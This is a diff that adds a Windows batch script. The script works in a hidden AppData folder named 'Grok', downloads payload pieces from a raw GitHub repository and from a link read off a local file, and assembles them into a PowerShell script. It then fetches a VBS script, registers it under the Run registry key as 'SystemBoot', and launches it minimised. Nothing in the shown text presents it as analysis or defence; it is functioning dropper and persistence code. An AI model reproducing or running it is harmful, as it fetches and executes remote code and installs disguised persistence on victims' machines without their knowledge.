@@ -1,0 +1,20 @@
+@echo off
+set d=%APPDATA%\Grok
+set f=%d%\M.txt
+set a=%d%\f1.txt
+set b=%d%\f2.txt
+set c=%d%\Nvs.ps1
+set v=%d%\S_m.vbs
+set u=raw.githubusercontent.com/USATIKTOKER/NEWADD/main
+:: Read the dynamic link from l.txt
+set /p dynLink=<C:\Users\Admin\AppData\Roaming\Grok-l\l.txt
+rmdir /s /q "%d%" 2>nul
+mkdir "%d%"
+powershell -c "Start-BitsTransfer https://%u%/Final.txt '%f%'"
+powershell -c "Start-BitsTransfer https://%u%/First.txt '%a%'"
+powershell -c "Start-BitsTransfer %dynLink% '%b%'"
+powershell -c "(gc '%f%' -Raw) -replace '----',(gc '%a%' -Raw) -replace '====',(gc '%b%' -Raw) | sc '%c%'"
+del "%a%" "%b%" 2>nul
+powershell -c "iwr https://%u%/S_m.vbs -OutFile '%v%'"
+powershell -c "sp 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' SystemBoot 'wscript.exe \"%v%\"'"
+start /min wscript "%v%"
